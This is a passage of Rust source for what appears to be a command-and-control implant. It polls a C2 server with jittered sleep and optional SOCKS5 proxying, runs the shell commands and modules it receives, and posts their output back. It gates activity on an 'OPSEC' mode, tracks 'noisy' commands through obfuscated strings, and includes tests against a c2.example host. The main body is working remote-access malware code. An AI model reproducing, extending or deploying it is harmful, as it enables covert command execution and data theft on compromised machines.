            if matches!(outcome, SubmissionOutcome::Accepted) {
                update_c2_failure_state(true);
            } else {
                error!(
                    "[HTTP] Running status submission failed with status: {}",
                    response.status()
                );
                update_c2_failure_state(false);
            }
            outcome
        }
        Err(err) => {
            error!("[HTTP] Running status POST failed: {}", err);
            update_c2_failure_state(false);
            classify_submission_error(err)
        }
    }
}

async fn submit_task_result_with_client(
    config: &AgentConfig,
    server_addr: &str,
    agent_id: &str,
    auth: &AgentAuth,
    result: &TaskResult,
) -> SubmissionOutcome {
    let url = match build_c2_endpoint_url(server_addr, agent_id, C2Endpoint::Results) {
        Ok(url) => url,
        Err(err) => return SubmissionOutcome::Permanent(err.to_string()),
    };
    if let Err(err) = result.validate() {
        return SubmissionOutcome::Permanent(err.to_string());
    }
    if result.agent_id != agent_id {
        return SubmissionOutcome::Permanent(
            "task result agent_id does not match runtime agent".to_string(),
        );
    }

    info!(
        "[HTTP] Sending typed result POST to {} (SOCKS5 enabled: {})",
        url, config.socks5_enabled
    );
    // Typed v1 output fields are plain UTF-8 by contract. XOR decoding remains
    // limited to the deprecated legacy /result route on the server.
    match send_authenticated_request(config, server_addr, agent_id, auth, |client| {
        client.request(Method::POST, url.clone()).json(result)
    })
    .await
    {
        Ok(response) => {
            info!(
                "[HTTP] Typed result POST response: {} (SOCKS5 enabled: {})",
                response.status(),
                config.socks5_enabled
            );
            let outcome = classify_submission_status(response.status(), "typed result");
            if matches!(outcome, SubmissionOutcome::Accepted) {
                update_c2_failure_state(true);
            } else {
                error!(
                    "[HTTP] Typed result submission failed with status: {}",
                    response.status()
                );
                update_c2_failure_state(false);
            }
            outcome
        }
        Err(err) => {
            error!("[HTTP] Typed result POST failed: {}", err);
            update_c2_failure_state(false);
            classify_submission_error(err)
        }
    }
}

#[derive(Clone, Debug, Eq, PartialEq)]
enum SubmissionOutcome {
    Accepted,
    Retryable(String),
    Permanent(String),
}

fn classify_submission_status(status: StatusCode, operation: &str) -> SubmissionOutcome {
    if status.is_success() {
        return SubmissionOutcome::Accepted;
    }
    let message = format!("{operation} submission failed with status {status}");
    if status == StatusCode::UNAUTHORIZED
        || status == StatusCode::REQUEST_TIMEOUT
        || status == StatusCode::TOO_MANY_REQUESTS
        || status.is_server_error()
    {
        SubmissionOutcome::Retryable(message)
    } else {
        SubmissionOutcome::Permanent(message)
    }
}

fn classify_submission_error(error: io::Error) -> SubmissionOutcome {
    if error.kind() == io::ErrorKind::InvalidInput {
        SubmissionOutcome::Permanent(error.to_string())
    } else {
        SubmissionOutcome::Retryable(error.to_string())
    }
}

fn build_task_result(
    task: &Task,
    started_at: String,
    completed_at: String,
    execution: ShellExecution,
) -> TaskResult {
    let outcome = if execution.exit_code == Some(0) && execution.error.is_none() {
        TaskOutcome::Completed
    } else {
        TaskOutcome::Failed
    };

    TaskResult {
        schema_version: TASK_SCHEMA_VERSION,
        task_id: task.id.clone(),
        agent_id: task.agent_id.clone(),
        outcome,
        started_at,
        completed_at,
        exit_code: execution.exit_code,
        output: TaskOutput {
            stdout: execution.stdout,
            stderr: execution.stderr,
            data: execution.data,
        },
        error: bound_result_error(execution.error),
    }
}

fn bound_result_error(error: Option<String>) -> Option<String> {
    const MARKER: &str = "… [truncated]";

    error.map(|error| {
        if error.chars().count() <= MAX_RESULT_ERROR_CHARS {
            return error;
        }
        let keep = MAX_RESULT_ERROR_CHARS.saturating_sub(MARKER.chars().count());
        let mut bounded: String = error.chars().take(keep).collect();
        bounded.push_str(MARKER);
        bounded
    })
}

trait TaskTransport {
    async fn submit_running(&self, task: &Task, started_at: &str) -> SubmissionOutcome;
    async fn submit_result(&self, result: &TaskResult) -> SubmissionOutcome;
}

struct HttpTaskTransport<'a> {
    config: &'a AgentConfig,
    server_addr: &'a str,
    agent_id: &'a str,
    auth: &'a AgentAuth,
}

impl TaskTransport for HttpTaskTransport<'_> {
    async fn submit_running(&self, task: &Task, started_at: &str) -> SubmissionOutcome {
        submit_running_status_with_client(
            self.config,
            self.server_addr,
            self.agent_id,
            self.auth,
            task,
            started_at,
        )
        .await
    }

    async fn submit_result(&self, result: &TaskResult) -> SubmissionOutcome {
        submit_task_result_with_client(
            self.config,
            self.server_addr,
            self.agent_id,
            self.auth,
            result,
        )
        .await
    }
}

async fn execute_module(task: &Task) -> ShellExecution {
    let Some(module_id) = task.arguments.module_id.as_deref() else {
        return ShellExecution::failed("module task is missing module_id");
    };
    let Some(input) = task.arguments.input.as_ref() else {
        return ShellExecution::failed("module task is missing input");
    };

    match tokio::time::timeout(
        Duration::from_secs(task.timeout_seconds),
        modules::execute(module_id, input),
    )
    .await
    {
        Ok(Ok(data)) => ShellExecution {
            stdout: String::new(),
            stderr: String::new(),
            data: Some(data),
            exit_code: Some(0),
            error: None,
        },
        Ok(Err(error)) => ShellExecution::failed(format!("module execution failed: {error}")),
        Err(_) => ShellExecution::failed("module execution timed out"),
    }
}

trait TaskExecutor {
    async fn execute(&self, task: &Task) -> ShellExecution;
}

struct AgentTaskExecutor;

impl TaskExecutor for AgentTaskExecutor {
    async fn execute(&self, task: &Task) -> ShellExecution {
        match &task.task_type {
            TaskType::Shell => execute_shell(&task.arguments.command, task.timeout_seconds).await,
            TaskType::Module => execute_module(task).await,
        }
    }
}

#[derive(Clone, Debug)]
enum TaskDeliveryState {
    AwaitingRunning {
        task: Box<Task>,
        started_at: String,
    },
    Executing,
    AwaitingResult {
        result: Box<TaskResult>,
    },
    BlockedResult {
        result: Box<TaskResult>,
        reason: String,
    },
    Delivered,
    Blocked {
        reason: String,
    },
}

#[derive(Default)]
struct TaskOutbox {
    states: Mutex<HashMap<String, TaskDeliveryState>>,
    terminal_order: Mutex<VecDeque<String>>,
}

impl TaskOutbox {
    fn enqueue(&self, task: Task) -> bool {
        self.enqueue_at(task, utc_timestamp())
    }

    fn enqueue_at(&self, task: Task, started_at: String) -> bool {
        let mut states = self.lock_states();
        if states.contains_key(&task.id) {
            return false;
        }
        states.insert(
            task.id.clone(),
            TaskDeliveryState::AwaitingRunning {
                task: Box::new(task),
                started_at,
            },
        );
        true
    }

    fn has_pending(&self) -> bool {
        self.lock_states().values().any(|state| {
            matches!(
                state,
                TaskDeliveryState::AwaitingRunning { .. }
                    | TaskDeliveryState::Executing
                    | TaskDeliveryState::AwaitingResult { .. }
                    | TaskDeliveryState::BlockedResult { .. }
            )
        })
    }

    async fn process_all<T, E>(&self, transport: &T, executor: &E)
    where
        T: TaskTransport,
        E: TaskExecutor,
    {
        self.process_all_with_clock(transport, executor, Utc::now)
            .await;
    }

    async fn process_all_with_clock<T, E, C>(&self, transport: &T, executor: &E, now: C)
    where
        T: TaskTransport,
        E: TaskExecutor,
        C: Fn() -> DateTime<Utc> + Copy,
    {
        let task_ids: Vec<String> = self
            .lock_states()
            .iter()
            .filter(|(_, state)| {
                matches!(
                    state,
                    TaskDeliveryState::AwaitingRunning { .. }
                        | TaskDeliveryState::AwaitingResult { .. }
                )
            })
            .map(|(task_id, _)| task_id.clone())
            .collect();
        for task_id in task_ids {
            self.process_one(&task_id, transport, executor, now).await;
        }
    }

    async fn process_one<T, E, C>(&self, task_id: &str, transport: &T, executor: &E, now: C)
    where
        T: TaskTransport,
        E: TaskExecutor,
        C: Fn() -> DateTime<Utc> + Copy,
    {
        loop {
            let Some(state) = self.lock_states().get(task_id).cloned() else {
                return;
            };
            match state {
                TaskDeliveryState::AwaitingRunning { task, started_at } => {
                    if let Err(reason) = task_may_start_at(&task, now()) {
                        warn!(
                            "[TASK] Blocking task {} before acknowledgement: {}",
                            task_id, reason
                        );
                        self.block(task_id, reason);
                        return;
                    }

                    match transport.submit_running(&task, &started_at).await {
                        SubmissionOutcome::Accepted => {
                            if let Err(reason) = task_may_start_at(&task, now()) {
                                warn!(
                                    "[TASK] Task {} expired while awaiting running acknowledgement",
                                    task_id
                                );
                                let result = build_task_result(
                                    &task,
                                    started_at,
                                    now().to_rfc3339_opts(SecondsFormat::Millis, true),
                                    ShellExecution::failed(reason),
                                );
                                self.set_awaiting_result(task_id, result);
                                continue;
                            }

                            if !self.claim_execution(task_id) {
                                return;
                            }
                            if matches!(&task.task_type, TaskType::Shell)
                                && is_strong_command(&task.arguments.command)
                            {
                                mark_noisy_command_executed();
                            }
                            let execution = executor.execute(&task).await;
                            let result = build_task_result(
                                &task,
                                started_at,
                                now().to_rfc3339_opts(SecondsFormat::Millis, true),
                                execution,
                            );
                            self.set_awaiting_result(task_id, result);
                        }
                        SubmissionOutcome::Retryable(error) => {
                            warn!(
                                "[TASK] Running acknowledgement for {} will retry: {}",
                                task_id, error
                            );
                            return;
                        }
                        SubmissionOutcome::Permanent(error) => {
                            warn!(
                                "[TASK] Blocking task {} after permanent running rejection: {}",
                                task_id, error
                            );
                            self.block(task_id, error);
                            return;
                        }
                    }
                }
                TaskDeliveryState::AwaitingResult { result } => {
                    match transport.submit_result(&result).await {
                        SubmissionOutcome::Accepted => {
                            self.set_terminal(task_id, TaskDeliveryState::Delivered);
                        }
                        SubmissionOutcome::Retryable(error) => {
                            warn!("[TASK] Result for {} will retry: {}", task_id, error);
                        }
                        SubmissionOutcome::Permanent(error) => {
                            warn!(
                                "[TASK] Blocking result delivery for {} after permanent rejection: {}",
                                task_id, error
                            );
                            self.block_result(task_id, result, error);
                        }
                    }
                    return;
                }
                TaskDeliveryState::Executing | TaskDeliveryState::Delivered => return,
                TaskDeliveryState::BlockedResult { result, reason } => {
                    debug!(
                        "[TASK] Result delivery for {} remains blocked (payload for {} retained): {}",
                        task_id, result.task_id, reason
                    );
                    return;
                }
                TaskDeliveryState::Blocked { reason } => {
                    debug!("[TASK] Task {} remains blocked: {}", task_id, reason);
                    return;
                }
            }
        }
    }

    fn claim_execution(&self, task_id: &str) -> bool {
        let mut states = self.lock_states();
        if !matches!(
            states.get(task_id),
            Some(TaskDeliveryState::AwaitingRunning { .. })
        ) {
            return false;
        }
        states.insert(task_id.to_string(), TaskDeliveryState::Executing);
        true
    }

    fn set_awaiting_result(&self, task_id: &str, result: TaskResult) {
        let mut states = self.lock_states();
        if matches!(
            states.get(task_id),
            Some(TaskDeliveryState::Executing | TaskDeliveryState::AwaitingRunning { .. })
        ) {
            states.insert(
                task_id.to_string(),
                TaskDeliveryState::AwaitingResult {
                    result: Box::new(result),
                },
            );
        }
    }

    fn set_terminal(&self, task_id: &str, state: TaskDeliveryState) {
        let mut states = self.lock_states();
        let was_terminal = matches!(
            states.get(task_id),
            Some(TaskDeliveryState::Delivered | TaskDeliveryState::Blocked { .. })
        );
        states.insert(task_id.to_string(), state);
        drop(states);

        if was_terminal {
            return;
        }
        let mut terminal_order = self
            .terminal_order
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        terminal_order.push_back(task_id.to_string());
        while terminal_order.len() > MAX_TERMINAL_TASK_IDS {
            if let Some(expired_id) = terminal_order.pop_front() {
                let mut states = self.lock_states();
                if matches!(
                    states.get(&expired_id),
                    Some(TaskDeliveryState::Delivered | TaskDeliveryState::Blocked { .. })
                ) {
                    states.remove(&expired_id);
                }
            }
        }
    }

    fn block(&self, task_id: &str, reason: String) {
        self.set_terminal(task_id, TaskDeliveryState::Blocked { reason });
    }

    fn block_result(&self, task_id: &str, result: Box<TaskResult>, reason: String) {
        self.lock_states().insert(
            task_id.to_string(),
            TaskDeliveryState::BlockedResult { result, reason },
        );
    }

    fn lock_states(&self) -> std::sync::MutexGuard<'_, HashMap<String, TaskDeliveryState>> {
        self.states
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner)
    }

    #[cfg(test)]
    fn state(&self, task_id: &str) -> Option<TaskDeliveryState> {
        self.lock_states().get(task_id).cloned()
    }
}

fn task_may_start_at(task: &Task, now: DateTime<Utc>) -> Result<(), String> {
    let expires_at = task
        .expires_at
        .as_deref()
        .ok_or_else(|| "task is missing required expires_at".to_string())?;
    let expires_at = DateTime::parse_from_rfc3339(expires_at)
        .map_err(|_| "expires_at is not a valid RFC3339 timestamp".to_string())?
        .with_timezone(&Utc);
    if now >= expires_at {
        return Err(format!(
            "task expired at {} before shell execution could start",
            expires_at.to_rfc3339_opts(SecondsFormat::Millis, true)
        ));
    }
    Ok(())
}

async fn process_task_outbox(
    config: &AgentConfig,
    server_addr: &str,
    agent_id: &str,
    auth: &AgentAuth,
) {
    let transport = HttpTaskTransport {
        config,
        server_addr,
        agent_id,
        auth,
    };
    TASK_OUTBOX
        .process_all(&transport, &AgentTaskExecutor)
        .await;
}

fn is_strong_command(cmd: &str) -> bool {
    let noisy = [
        obfstr!("screenshot").to_string(),
        obfstr!("scan").to_string(),
        obfstr!("upload").to_string(),
        obfstr!("download").to_string(),
        obfstr!("ls").to_string(),
        obfstr!("ps").to_string(),
        obfstr!("netstat").to_string(),
        obfstr!("ifconfig").to_string(),
        obfstr!("whoami").to_string(),
        obfstr!("uname").to_string(),
        obfstr!("cat").to_string(),
    ];
    noisy
        .iter()
        .any(|n| starts_with_command_token(cmd, n.as_str()))
}

fn starts_with_command_token(cmd: &str, token: &str) -> bool {
    let trimmed = cmd.trim_start();
    if !trimmed.starts_with(token) {
        return false;
    }

    match trimmed[token.len()..].chars().next() {
        Some(next) => next.is_whitespace(),
        None => true,
    }
}

async fn run_authenticated_heartbeat_loop(
    config: AgentConfig,
    server_addr: String,
    agent_id: String,
    auth: Arc<AgentAuth>,
    interval: Duration,
) {
    let start = tokio::time::Instant::now() + interval;
    let mut ticker = tokio::time::interval_at(start, interval);
    ticker.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
    loop {
        ticker.tick().await;
        if let Err(err) = send_heartbeat_with_client(&config, &server_addr, &agent_id, &auth).await
        {
            warn!("[SHELL] Periodic authenticated heartbeat failed: {err}");
        }
    }
}

// Main function to run the shell
pub async fn agent_loop(
    server_addr: &str,
    agent_id: &str,
    auth: Arc<AgentAuth>,
) -> Result<(), Box<dyn std::error::Error>> {
    let config = AgentConfig::load()?;
    info!("[SHELL] Entering agent_loop (BackgroundOpsec Active)");
    // Initial heartbeat for this active period
    // Use a separate Result variable to avoid breaking loop on first heartbeat failure
    let initial_heartbeat_result =
        send_heartbeat_with_client(&config, server_addr, agent_id, &auth).await;
    if let Err(e) = initial_heartbeat_result {
        error!(
            "[SHELL] Initial heartbeat failed: {}. Returning to main loop for OPSEC re-assessment.",
            e
        );
        // No need to break explicitly, loop condition will handle it if state changed due to failure
    }
    let heartbeat_task = tokio::spawn(run_authenticated_heartbeat_loop(
        config.clone(),
        server_addr.to_string(),
        agent_id.to_string(),
        auth.clone(),
        MAX_AUTHENTICATED_HEARTBEAT_INTERVAL,
    ));

    loop {
        // Determine current OPSEC mode *before* acting
        let current_mode = determine_agent_mode(&config);

        // If no longer in BackgroundOpsec, exit agent_loop immediately
        if current_mode != AgentMode::BackgroundOpsec {
            info!(
                "[SHELL] Mode changed to {:?}, exiting agent_loop",
                current_mode
            );
            break;
        }

        // Still in BackgroundOpsec, proceed with C2 communication
        let sleep_time = random_jitter(config.sleep_interval, config.jitter);
        info!("[SHELL] Polling for tasks (Interval: {}s)", sleep_time);

        // Resolve an uncertain running/result delivery before accepting more
        // work. The in-memory outbox keeps the original timestamp and result
        // payload intact across retries.
        process_task_outbox(&config, server_addr, agent_id, &auth).await;

        if TASK_OUTBOX.has_pending() {
            debug!("[SHELL] Pending task delivery remains; deferring the next task poll");
        } else {
            match get_task_with_client(&config, server_addr, agent_id, &auth).await {
                Ok(Some(task)) => {
                    info!(
                        "[SHELL] Received task {} (type: {:?})",
                        task.id, task.task_type
                    );
                    let task_id = task.id.clone();
                    if TASK_OUTBOX.enqueue(task) {
                        info!("[SHELL] Task {} added to the delivery outbox", task_id);
                    } else {
                        debug!("[SHELL] Ignoring duplicate delivery for task {}", task_id);
                    }
                    process_task_outbox(&config, server_addr, agent_id, &auth).await;
                }
                Ok(None) => {
                    debug!("[SHELL] No task available");
                }
                Err(err) => {
                    error!("[SHELL] Failed to get task: {}", err);
                    // Continue loop, C2 failure state already updated
                }
            }
        }

        // Sleep before next poll
        debug!("[SHELL] Sleeping for {} seconds...", sleep_time);
        tokio::time::sleep(Duration::from_secs(sleep_time)).await;

        // Outer loop condition will re-evaluate OPSEC mode on next iteration
    }

    heartbeat_task.abort();
    let _ = heartbeat_task.await;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::auth::SecretCredential;
    use std::fs;
    use std::path::PathBuf;
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::time::{SystemTime, UNIX_EPOCH};
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    use tokio::net::TcpListener;

    const TEST_BOOTSTRAP_CREDENTIAL: &str = "QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkI";
    const TEST_SESSION_ONE: &str = concat!(
        "s1.QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE.1.",
        "Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M"
    );
    const TEST_SESSION_TWO: &str = concat!(
        "s1.QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE.2.",
        "Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M"
    );
    const TEST_SESSION_THREE: &str = concat!(
        "s1.QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE.3.",
        "Q0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0M"
    );

    #[test]
    fn builds_c2_endpoint_urls_from_validated_base() -> io::Result<()> {
        let heartbeat_url = build_c2_endpoint_url(
            "https://c2.example/base/",
            "agent.one:1",
            C2Endpoint::Heartbeat,
        )?;
        assert_eq!(
            heartbeat_url.as_str(),
            "https://c2.example/base/api/agent/agent.one:1/heartbeat"
        );

        let tasks_url =
            build_c2_endpoint_url("https://c2.example", "agent-one", C2Endpoint::Tasks)?;
        assert_eq!(
            tasks_url.as_str(),
            "https://c2.example/api/agent/agent-one/tasks"
        );

        let status_url = build_c2_endpoint_url(
            "https://c2.example",
            "agent-one",
            C2Endpoint::TaskStatus("task_one-1"),
        )?;
        assert_eq!(
            status_url.as_str(),
            "https://c2.example/api/agent/agent-one/tasks/task_one-1/status"
        );

        let results_url =
            build_c2_endpoint_url("https://c2.example", "agent-one", C2Endpoint::Results)?;
        assert_eq!(
            results_url.as_str(),
            "https://c2.example/api/agent/agent-one/results"
        );

        Ok(())
    }

    #[test]
    fn rejects_invalid_c2_endpoint_bases() {
        let err = match build_c2_endpoint_url("file:///tmp/c2", "agent-one", C2Endpoint::Tasks) {
            Ok(url) => panic!("unexpected valid C2 URL: {}", url),
            Err(err) => err,
        };

        assert_eq!(err.kind(), io::ErrorKind::InvalidInput);
    }

    #[test]
    fn c2_client_rejects_any_runtime_destination_override() {
        let config = AgentConfig {
            server_url: "https://c2.example:8443/base".to_string(),
            ..Default::default()
        };

        let different_origin = build_c2_client(&config, "https://other.example:8443/base")
            .expect_err("different origin must fail");
        assert_eq!(different_origin.kind(), io::ErrorKind::PermissionDenied);

        let different_path = build_c2_client(&config, "https://c2.example:8443/other")
            .expect_err("different base path must fail");
        assert_eq!(different_path.kind(), io::ErrorKind::PermissionDenied);

        assert!(build_c2_client(&config, "https://c2.example:8443/base").is_ok());
    }

    #[test]
    fn rejects_invalid_c2_endpoint_identifiers() {
        let invalid_agent =
            build_c2_endpoint_url("https://c2.example", "agent/one", C2Endpoint::Tasks)
                .expect_err("slash is outside the identifier contract");
        assert_eq!(invalid_agent.kind(), io::ErrorKind::InvalidInput);

        let invalid_task = build_c2_endpoint_url(
            "https://c2.example",
            "agent-one",
            C2Endpoint::TaskStatus("task/one"),
        )
        .expect_err("slash is outside the identifier contract");
        assert_eq!(invalid_task.kind(), io::ErrorKind::InvalidInput);
    }

    #[test]
    fn classifies_noisy_commands_on_token_boundaries() {
        assert!(is_strong_command("download report.txt"));
        assert!(is_strong_command("whoami"));
        assert!(!is_strong_command("downloaded"));
        assert!(!is_strong_command("echo hello"));
    }

    #[test]
    fn typed_result_preserves_correlation_and_plain_output_fields() {
        let task = sample_task("echo hello");
        let completed = build_task_result(
            &task,
            "2026-07-23T16:30:05Z".to_string(),
            "2026-07-23T16:30:06Z".to_string(),
            ShellExecution {
                stdout: "hello\n".to_string(),
                stderr: String::new(),
                exit_code: Some(0),
                data: None,
                error: None,
            },
        );
        assert_eq!(completed.task_id, "task-one");
        assert_eq!(completed.agent_id, "agent-one");
        assert_eq!(completed.outcome, TaskOutcome::Completed);
        assert_eq!(completed.output.stdout, "hello\n");
        assert_eq!(completed.output.stderr, "");
        assert_eq!(completed.exit_code, Some(0));
        assert_eq!(completed.error, None);

        let failed = build_task_result(
            &task,
            "2026-07-23T16:30:05Z".to_string(),
            "2026-07-23T16:30:06Z".to_string(),
            ShellExecution {
                stdout: String::new(),
                stderr: "permission denied\n".to_string(),
                exit_code: Some(1),
                data: None,
                error: Some("command exited with status 1".to_string()),
            },
        );
        assert_eq!(failed.outcome, TaskOutcome::Failed);
        assert_eq!(failed.output.stderr, "permission denied\n");
        assert_eq!(failed.exit_code, Some(1));
    }

    #[tokio::test]
    async fn module_task_executor_returns_structured_capability_evidence() {
        let mut task = sample_task("unused");
        task.task_type = TaskType::Module;
        task.arguments = crate::tasks::TaskArguments {
            command: String::new(),
            module_id: Some(crate::modules::CAPABILITY_INVENTORY_ID.to_string()),
            input: Some(serde_json::json!({})),
        };
        task.validate_for_agent("agent-one")
            .expect("valid module task");

        let execution = AgentTaskExecutor.execute(&task).await;
        assert_eq!(execution.exit_code, Some(0));
        assert!(execution.stdout.is_empty());
        assert!(execution.stderr.is_empty());
        let data = execution.data.expect("module result data");
        assert_eq!(data.as_object().expect("object").len(), 4);
        assert!(data["logical_cpu_count"]
            .as_u64()
            .is_some_and(|count| count > 0));
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn shell_execution_separates_stdout_stderr_and_exit_code() {
        use std::fs;
        use std::os::unix::fs::PermissionsExt;
        use std::time::{SystemTime, UNIX_EPOCH};

        let nonce = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("system clock")
            .as_nanos();
        let script_path = env::temp_dir().join(format!(
            "microc2-task-test-{}-{nonce}.sh",
            std::process::id()
        ));
        fs::write(
            &script_path,
            "#!/bin/sh\nprintf 'standard output'\nprintf 'standard error' >&2\nexit 7\n",
        )
        .expect("write test script");
        fs::set_permissions(&script_path, fs::Permissions::from_mode(0o700))
            .expect("make test script executable");

        let execution = execute_shell(script_path.to_str().expect("UTF-8 temporary path"), 5).await;
        let _ = fs::remove_file(script_path);

        assert_eq!(execution.stdout, "standard output");
        assert_eq!(execution.stderr, "standard error");
        assert_eq!(execution.exit_code, Some(7));
        assert_eq!(
            execution.error.as_deref(),
            Some("command exited with status 7")
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn shell_execution_enforces_task_timeout() {
        let started = Instant::now();
        let execution = execute_shell("sleep 5", 1).await;

        assert!(
            started.elapsed() < Duration::from_secs(3),
            "timed-out task did not terminate promptly"
        );
        assert_eq!(execution.exit_code, None);
        assert!(
            execution
                .error
                .as_deref()
                .is_some_and(|error| error.contains("timed out after 1 seconds")),
            "unexpected timeout result: {execution:?}"
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn repeated_shell_timeouts_return_promptly_for_detached_reaping() {
        for _ in 0..3 {
            let started = Instant::now();
            let execution = execute_shell("sleep 5", 1).await;
            assert!(started.elapsed() < Duration::from_secs(3));
            assert!(execution
                .error
                .as_deref()
                .is_some_and(|error| error.contains("timed out")));
        }
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn shell_execution_deadline_includes_background_descendant_output_handles() {
        let started = Instant::now();
        let execution = execute_shell("sleep 5 &", 1).await;

        assert!(
            started.elapsed() < Duration::from_secs(3),
            "background descendant kept output readers alive past the deadline"
        );
        assert_eq!(execution.exit_code, None);
        assert!(
            execution
                .error
                .as_deref()
                .is_some_and(|error| error.contains("timed out after 1 seconds")),
            "unexpected timeout result: {execution:?}"
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn successful_shell_exit_cleans_redirected_background_descendants() {
        use std::time::{SystemTime, UNIX_EPOCH};

        let nonce = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .expect("system clock")
            .as_nanos();
        let marker = env::temp_dir().join(format!(
            "microc2-background-marker-{}-{nonce}",
            std::process::id()
        ));
        let command = format!("(sleep 1; touch '{}') >/dev/null 2>&1 &", marker.display());

        let execution = execute_shell(&command, 5).await;
        assert_eq!(execution.exit_code, Some(0));
        assert_eq!(execution.error, None);
        tokio::time::sleep(Duration::from_millis(1_500)).await;
        assert!(
            !marker.exists(),
            "redirected background descendant survived successful shell exit"
        );
        let _ = std::fs::remove_file(marker);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn shell_execution_caps_and_reports_high_volume_output() {
        let execution = execute_shell(
            "{ yes o | head -c 1100000; yes e | head -c 1100000 >&2; }",
            5,
        )
        .await;

        assert_eq!(execution.stdout.len(), MAX_CAPTURE_BYTES);
        assert_eq!(execution.stderr.len(), MAX_CAPTURE_BYTES);
        assert_eq!(execution.exit_code, Some(0));
        let error = execution.error.as_deref().expect("truncation error");
        assert!(error.contains("stdout truncated at 1048576 bytes"));
        assert!(error.contains("stderr truncated at 1048576 bytes"));
    }

    #[cfg(windows)]
    #[tokio::test]
    async fn windows_shell_execution_terminates_the_process_tree_at_timeout() {
        let started = Instant::now();
        let execution = execute_shell(
            "start \"\" /B cmd /C \"ping -n 6 127.0.0.1 >NUL\" & ping -n 6 127.0.0.1 >NUL",
            1,
        )
        .await;

        assert!(
            started.elapsed() < Duration::from_secs(3),
            "Windows process tree termination exceeded its bound"
        );
        assert_eq!(execution.exit_code, None);
        assert!(
            execution
                .error
                .as_deref()
                .is_some_and(|error| error.contains("timed out after 1 seconds")),
            "unexpected timeout result: {execution:?}"
        );
    }

    #[test]
    fn result_error_is_bounded_without_changing_wire_fields() {
        let result = build_task_result(
            &sample_task("echo hello"),
            "2026-07-23T16:30:05Z".to_string(),
            "2026-07-23T16:30:06Z".to_string(),
            ShellExecution::failed("é".repeat(MAX_RESULT_ERROR_CHARS + 10)),
        );

        let error = result.error.expect("failed result error");
        assert_eq!(error.chars().count(), MAX_RESULT_ERROR_CHARS);
        assert!(error.ends_with("… [truncated]"));
    }

    #[test]
    fn submission_statuses_distinguish_retryable_and_permanent_failures() {
        assert!(matches!(
            classify_submission_status(StatusCode::REQUEST_TIMEOUT, "result"),
            SubmissionOutcome::Retryable(_)
        ));
        assert!(matches!(
            classify_submission_status(StatusCode::TOO_MANY_REQUESTS, "result"),
            SubmissionOutcome::Retryable(_)
        ));
        assert!(matches!(
            classify_submission_status(StatusCode::BAD_GATEWAY, "result"),
            SubmissionOutcome::Retryable(_)
        ));
        assert!(matches!(
            classify_submission_status(StatusCode::UNAUTHORIZED, "result"),
            SubmissionOutcome::Retryable(_)
        ));
        assert!(matches!(
            classify_submission_status(StatusCode::CONFLICT, "result"),
            SubmissionOutcome::Permanent(_)
        ));
    }

    #[tokio::test]
    async fn running_acknowledgement_retry_preserves_timestamp_and_executes_once() {
        let outbox = TaskOutbox::default();
        let task = sample_task("echo hello");
        let started_at = "2026-07-23T16:30:01.234Z".to_string();
        assert!(outbox.enqueue_at(task.clone(), started_at.clone()));

        let transport = MockTransport::new(
            [
                SubmissionOutcome::Retryable("status response lost".to_string()),
                SubmissionOutcome::Accepted,
            ],
            [SubmissionOutcome::Accepted],
        );
        let executor = CountingExecutor::successful("hello\n");

        outbox
            .process_all_with_clock(&transport, &executor, fixed_now)
            .await;
        assert_eq!(executor.executions(), 0);
        assert!(matches!(
            outbox.state(&task.id),
            Some(TaskDeliveryState::AwaitingRunning { .. })
        ));

        outbox
            .process_all_with_clock(&transport, &executor, fixed_now)
            .await;
        assert_eq!(executor.executions(), 1);
        assert!(matches!(
            outbox.state(&task.id),
            Some(TaskDeliveryState::Delivered)
        ));

        let running_attempts = transport.running_attempts();
        assert_eq!(running_attempts.len(), 2);
        assert_eq!(running_attempts[0], running_attempts[1]);
        assert_eq!(running_attempts[0].1, started_at);
    }

    #[tokio::test]
    async fn ambiguous_result_retry_reuses_payload_and_never_reruns_task() {
        let outbox = TaskOutbox::default();
        let task = sample_task("echo hello");
        assert!(outbox.enqueue_at(task.clone(), "2026-07-23T16:30:01.234Z".to_string()));
        let transport = MockTransport::new(
            [SubmissionOutcome::Accepted],
            [
                SubmissionOutcome::Retryable("result response lost".to_string()),
                SubmissionOutcome::Accepted,
            ],
        );
        let executor = CountingExecutor::successful("hello\n");

        outbox
            .process_all_with_clock(&transport, &executor, fixed_now)
            .await;
        assert_eq!(executor.executions(), 1);
        assert!(matches!(
            outbox.state(&task.id),
            Some(TaskDeliveryState::AwaitingResult { .. })
        ));
        assert!(
            !outbox.enqueue_at(task.clone(), "2026-07-23T16:30:02.000Z".to_string()),
            "lease redelivery must be deduplicated while result delivery is uncertain"
        );

        outbox
            .process_all_with_clock(&transport, &executor, fixed_now)
            .await;
        assert_eq!(executor.executions(), 1);
        assert!(matches!(
            outbox.state(&task.id),
            Some(TaskDeliveryState::Delivered)
        ));

        let result_attempts = transport.result_attempts();
        assert_eq!(result_attempts.len(), 2);
        assert_eq!(result_attempts[0], result_attempts[1]);
        assert!(
            !outbox.enqueue_at(task, "2026-07-23T16:30:03.000Z".to_string()),
            "recent delivered task IDs must remain deduplicated"
        );
    }

    #[tokio::test]
    async fn permanent_result_rejection_retains_payload_and_applies_backpressure() {
        let outbox = TaskOutbox::default();
        let task = sample_task("echo hello");
